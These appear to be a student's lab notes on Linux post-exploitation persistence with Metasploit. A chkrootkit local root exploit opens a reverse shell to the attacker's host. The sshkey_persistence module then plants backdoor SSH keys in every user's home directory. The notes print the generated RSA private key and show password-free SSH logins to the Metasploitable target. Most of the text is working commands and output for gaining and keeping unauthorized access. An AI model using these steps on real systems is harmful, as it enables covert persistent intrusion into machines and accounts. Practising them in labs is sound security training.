
using `post/linux/manage/sshkey_persistence` module, this module sets up private and public SSH key pair, it will then add the public into the home directories of all users accounts, and will provide us private key and then we can use that private key to authenticate with any of the user account without providing a password

**************************************************************************************************************************************************
# Consider we already achieved root privileges by vulnerable chkrootkit program

msf5 exploit(unix/local/chkrootkit) > run

[*] Started reverse TCP double handler on 192.6.5.2:4444 
[!] Rooting depends on the crontab (this could take a while)
[*] Payload written to /tmp/update
[*] Waiting for chkrootkit to run via cron...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo LYEi6iPnzn3u2Ih9;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "LYEi6iPnzn3u2Ih9\r\n"
[*] Matching...
[*] B is input...
[*] Command shell session 3 opened (192.6.5.2:4444 -> 192.6.5.3:53724) at 2024-01-12 04:17:06 +0000
[+] Deleted /tmp/update

/bin/bash -i
bash: cannot set terminal process group (26): Inappropriate ioctl for device
bash: no job control in this shell
root@victim-1:~# whoami
whoami
root
root@victim-1:~# 

# Lets Explore persistence modules, we can see we have a few modules, these use diffrent linux features/programs to elevate privileges

root@victim-1:~# ^Z
Background session 3? [y/N]  y
msf5 exploit(unix/local/chkrootkit) > `search platform:linux persistence`

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank       Check  Description
   -  ----                                                 ---------------  ----       -----  -----------
   0  exploit/linux/local/apt_package_manager_persistence  1999-03-09       excellent  No     APT Package Manager Persistence
   1  exploit/linux/local/autostart_persistence            2006-02-13       excellent  No     Autostart Desktop Item Persistence
   2  exploit/linux/local/bash_profile_persistence         1989-06-08       normal     No     Bash Profile Persistence
   3  exploit/linux/local/cron_persistence                 1979-07-01       excellent  No     Cron Persistence
   4  exploit/linux/local/rc_local_persistence             1980-10-01       excellent  No     rc.local Persistence
   5  exploit/linux/local/service_persistence              1983-01-01       excellent  No     Service Persistence
   6  exploit/linux/local/yum_package_manager_persistence  2003-12-17       excellent  No     Yum Package Manager Persistence
   7  post/linux/manage/sshkey_persistence                                  excellent  No     SSH Key Persistence


msf5 exploit(unix/local/chkrootkit) > 

# Lets check one using `post/linux/manage/sshkey_persistence` module, this module sets up private and public SSH key pair, it will then add the public into the home directories of all users accounts, and will provide us private key and then we can use that private key to authenticate with any of the user account without providing a password

msf5 exploit(linux/local/cron_persistence) > use post/linux/manage/sshkey_persistence
msf5 post(linux/manage/sshkey_persistence) > info

       Name: SSH Key Persistence
     Module: post/linux/manage/sshkey_persistence
   Platform: Linux
       Arch: 
       Rank: Excellent

Provided by:
  h00die <mike@shorebreaksecurity.com>

Compatible session types:
  Meterpreter
  Shell

Basic options:
  Name             Current Setting       Required  Description
  ----             ---------------       --------  -----------
  CREATESSHFOLDER  false                 yes       If no .ssh folder is found, create it for a user
  PUBKEY                                 no        Public Key File to use. (Default: Create a new one)
  SESSION                                yes       The session to run this module on.
  SSHD_CONFIG      /etc/ssh/sshd_config  yes       sshd_config file
  USERNAME                               no        User to add SSH key to (Default: all users on box)

Description:
  This module will add an SSH key to a specified user (or all), to 
  allow remote login via SSH at any time.

# We will set CREATESSHFOLDER as true because in some target its not there already created, we can also specify USERNAME for the user account we want to have persistence but by default it will add the public key to all account home dir, since in this case we want to add persistnce for all user we will leave it

NOTE - the module dindt worked on lab so showing it in metasploitable machine
So consider we gained acceess to msfadmin user


msf6 post(linux/manage/sshkey_persistence) > `set CREATESSHFOLDER true`
CREATESSHFOLDER => true
msf6 post(linux/manage/sshkey_persistence) > `set session 5`
session => 5
msf6 post(linux/manage/sshkey_persistence) > `run`

[*] Checking SSH Permissions
[*] Authorized Keys File: .ssh/authorized_keys
[*] Finding .ssh directories
[*] Creating //.ssh folder
[*] Creating /bin/.ssh folder
[*] Creating /dev/.ssh folder
[*] Creating /home/ftp/.ssh folder
[*] Creating /home/ftp
/.ssh folder
[*] Creating /home/klog/.ssh folder
[*] Creating /home/msfadmin
/.ssh folder
[*] Creating /home/service/.ssh folder
[*] Creating /home/service
/.ssh folder
[*] Creating /home/syslog/.ssh folder
[*] Creating /nonexistent/.ssh folder
[*] Creating /usr/games/.ssh folder
[*] Creating /usr/sbin/.ssh folder
[*] Creating /usr/share/tomcat5.5/.ssh folder
[*] Creating /var/backups/.ssh folder
[*] Creating /var/cache/bind/.ssh folder
[*] Creating /var/cache/man/.ssh folder
[*] Creating /var/lib/gnats/.ssh folder
[*] Creating /var/lib/libuuid/.ssh folder
[*] Creating /var/lib/mysql/.ssh folder
[*] Creating /var/lib/nfs/.ssh folder
[*] Creating /var/lib/postgresql/.ssh folder
[*] Creating /var/list/.ssh folder
[*] Creating /var/mail/.ssh folder
[*] Creating /var/run/ircd/.ssh folder
[*] Creating /var/run/proftpd/.ssh folder
[*] Creating /var/run/sshd/.ssh folder
[*] Creating /var/spool/lpd/.ssh folder
[*] Creating /var/spool/news/.ssh folder
[*] Creating /var/spool/postfix/.ssh folder
[*] Creating /var/spool/uucp/.ssh folder
[*] Creating /var/www/.ssh folder
[+] Storing new private key as /home/kali/.msf4/loot/20240112083512_default_192.168.204.132_id_rsa_028414.txt
[*] Adding key to /home/msfadmin/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /home/user/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /root/.ssh/authorized_keys
[+] Key Added
[*] Post module execution completed
msf6 post(linux/manage/sshkey_persistence) > 


# The module has added ssh directory for allusers as well as addedd the ssh public key to all users home directory

# It also gave us the private key so lets see it

msf6 post(linux/manage/sshkey_persistence) > `cat /home/kali/.msf4/loot/20240112083512_default_192.168.204.132_id_rsa_028414.txt`
[*] exec: cat /home/kali/.msf4/loot/20240112083512_default_192.168.204.132_id_rsa_028414.txt

-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvefBVepJmtvmdcSo+/ptNYMX4NiKR0c+qmfsgRXqvxgJdu4d
6DdIzq76YslAJjCJ+U7R5EKlr+ziOD+f19Jgh7qsyhx9HSCu6QRUhRz2JCXtcZQU
pltvLIwk13gwazanJZ62h5nN1fEJliVvuB/hAm2yr4Ks9PV6mdN+bqDtHma7CxyU
q6OSROGmx/49ntf4hItuvLwRAmxIB6hPJxoorviO5RR1H6ov9jWqvYmR0WFqfs0D
KxGexEbfiurQRxP4yq4NlU4oF+qE8DJyhNc918F/3Xf0LcsTmdEHnySm4XHs/9R3
Cq+APqjYyDSg+Bz8hUrZsj0JmoFZOlRsNQofewIDAQABAoIBAB4NRcAV0k4KTH8I
fwFZEN0uAKJZQhCjipwm0/tdf4d8A0tpxRvRW9kxQXhOhrNEbSEhwv9POK8NWoMy
NlZN+W6hMOTO+1GXsXY4dDOYcK8pvViC6X2l7ILtLotWfrsIrAy8//+XbEZV3YGA
LRzDFrVurJ8vm7Ur/5nGKTTSjJOJwjqTIlB03GUyhBF6iJwE4opkLnCakh0YHsYI
9uK5YFCiIJIK3TyyePpGlYRp39CjMgoNIHZ4xYyqw5j2njF4xdjm24m6vIy6Gk7O
zc6sdacs3oQF7lh1EqjW+nmLCjGPmWc0d3u+LpnR1GpAPKHKzhv8AiXncpxEBD2x
eI4qRlkCgYEA769DYCfkVSqqeYs3XZ+ZRQKVTM57U86o4cEWSI1TCJ2OE/4jvvAV
bBNjk0Fq+8huwPPN9GOEs8fbVsyCxBJ8UBW5KndYxse8JrGHO+cVCSI+TIlG2bDS
ucwCCpkimvhT+wnv7392TU7hG0nV2qWLzc1rSlczRETBkYTItizbhCcCgYEAytUJ
+9/dO9FATaXeDSF+kfR6eAKEs6IL7M0B0pL1YezfVIOTWVv+xGkdFmYXbAjTABq6
eOgnC66ImwqgP/D7sj41RwY0nTwrud/z5KchzL+FeqTsQAX1CkxZSUjqCQhMWjTw
e/yIQQgCbvidc2hT6y/72EZjMGXA89O3i0myuo0CgYBlAIUy4vycSxN1jo3xPQ0Y
gKMrr6NWyLJwF67tOeiwq7wwfprPnlpYpb8DUcDkgyzw0IyMnNdR7zll1V6Rg3yx
PsY9t/dIJOkLoSnsu08o/y4jkIGzwIi8VNTTZH6psVWqZyCd2yeeIkxH9JBSyAom
2paIyEBJV3P+f2cZJcQHZwKBgAzSgOoSUdsJNGZ0OOBdoLG7Yc6aYic09EoI/7d/
INIK9mdSVgtNHILwHi2fUJW8zRHxnp4sFuPPKcWbW1wPcOnosteFlefmuODsPm/S
/PkDln2VVXYKql33S6GtYVYm1yTQue8snLR3vCelwdZc3wk8JFCcyoJxvEvts2mz
w/+1AoGAXC1yPngYKB8/9eXIE5PLaDYwUuCoTqSkleh1qAxaSfTzc/VCFkZWzNid
9ERXcQ9EXzsu178M+6blQdsXeCaCQ/4HszEgD7OVd9Lpxkgbsg/FdnN/WOhTpJEs
q69bl0ZuNq5OGYHiIbbE+xYX0tpguka4wRVMIAwDuDtgHT3iHGg=
-----END RSA PRIVATE KEY-----
msf6 post(linux/manage/sshkey_persistence) > 

# Now lets terminate / kill all sessions totarget by exiting from metasploit

msf6 post(linux/manage/sshkey_persistence) > exit -y

# We will then create a file named `ssh-key` or whatever and copy our private key in it, we will give it appropriate persmission

┌──(kali㉿kali)-[/tmp]
└─$ `touch ssh-key`
┌──(kali㉿kali)-[/tmp]
└─$ `chmod 0400 ssh-key`

# Now we can authenticate to any user using key

# Note since we addedd public key to all user accounts , we can use any account like msfadmin, user, root etc

┌──(kali㉿kali)-[/tmp]
└─$ ssh -i ssh-key msfadmin@192.168.204.132                            
Unable to negotiate with 192.168.204.132 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss

Error resolution - `-o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa`
Note: If you get an error saying Unable to negotiate with <IP> port 22: no matching how to key type found. Their offer: ssh-rsa, ssh-dss this is because OpenSSH have deprecated ssh-rsa. Add -oHostKeyAlgorithms=+ssh-rsa to your command to connect.


# SSH worked fine for msfadmin without asking password, however since we didnt ran that module with root privileges its asking password for other users

┌──(kali㉿kali)-[/tmp]
└─$ `ssh -i ssh-key msfadmin@192.168.204.132 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa`
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
No mail.
Last login: Fri Jan 12 09:05:24 2024 from 192.168.204.130
msfadmin@metasploitable:~$ whoami
msfadmin
msfadmin@metasploitable:~$ ls
vulnerable
msfadmin@metasploitable:~$ 

┌──(kali㉿kali)-[/tmp]
└─$ `ssh -i ssh-key user@192.168.204.132 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa`    
user@192.168.204.132's password: 

┌──(kali㉿kali)-[/tmp]
└─$ `ssh -i ssh-key root@192.168.204.132 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa `   
root@192.168.204.132's password: 


# So if we able to gain root user privileges then we should run this module with it and then we will be able to ssh by any user including root without password
